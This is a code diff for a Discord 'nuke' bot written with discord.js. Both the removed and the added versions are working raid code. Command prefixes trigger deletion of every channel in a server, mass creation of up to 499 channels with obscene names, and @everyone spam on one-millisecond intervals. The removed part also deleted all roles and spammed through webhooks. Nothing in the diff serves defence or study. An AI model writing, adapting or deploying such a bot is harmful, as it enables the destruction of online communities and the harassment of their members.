@@ -5,11 +5,12 @@ const {
   GatewayIntentBits,
   Collection,
 } = require("discord.js");
-const { Guilds, GuildMembers, GuildMessages } = GatewayIntentBits;
+const { Guilds, GuildMembers, GuildMessages, MessageContent } = GatewayIntentBits;
 const { User, Message, GuildMember, ThreadMember } = Partials;
+const red = require("chalk");
 
 const client = new Client({
-  intents: [Guilds, GuildMembers, GuildMessages],
+  intents: [Guilds, GuildMembers, GuildMessages, MessageContent ],
   partials: [User, Message, GuildMember, ThreadMember],
 });
 client.config = require("./config.json");
@@ -35,27 +36,37 @@ client.on('ready', () => {
    `;
 
   console.clear();
-  console.log(aSName);
+  console.log(red(aSName));
 });
 
 client.on('messageCreate', async (message) => {
-console.log("msg");
-if( message.content.toLowerCase().startsWith(client.config.PREFIX + "nuke")) {
-  message.guild.channels.forEach(channel => channel.delete());
-  message.guild.roles.cache.forEach(roles => {
-    roles.delete()
-    .then(deleted => console.log(`Deleted role ${deleted.name}`))
-    .catch(console.error);
-  });
-  message.guild.channels.create(`Fucked by ${message.author.username}`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) });
-  message.channel.createWebhook(`Fucked by ${message.author.username}`)
-    .then(wb => message.channel.send(`@everyone you are getting fucked by ${message.author.username} and God Kama`))
-    .catch(console.error)
-    setInterval(() => {
-      message.guild.channels.forEach(channel => channel.wb.send("@everyone fucked by Kama"))
-    }, 1);
-    setInterval(() => {
-      message.guild.channels.forEach(channel => channel.wb.send("@everyone dev by Kama"))
-    }, 1);
-  }
-});
+  console.log(message.content)
+  if(message.content.startsWith("dc")) {
+    message.guild.channels.cache.forEach((ch) => ch.delete())
+  };
+
+  if(message.content.startsWith("mc")) {
+  for (let i = 0; i < 499; i++) {
+                  if (message.guild.channels.cache.size === 499) break;
+                  else {
+                    console.log("cnl")
+                      message.guild.channels.create({name: "Fucked by Kama", type: 0 })
+                  }  
+  };
+  };
+  
+  if(message.content.startsWith("ping")) {
+    console.log("pc")
+    for (let i = 0; i < 499; i++) {
+      if (message.guild.channels.cache.size === 499) { 
+        break
+      } else { message.guild.channels.create({name: `${message.author.username} fucked you`, type: 0 }).then((ch) => {
+        setInterval(() => {
+            ch.send(`@everyone Fucked by Kama and ${message.author.username}`);
+        }, 1);
+      })};
+    };
+  };
+
+
+})
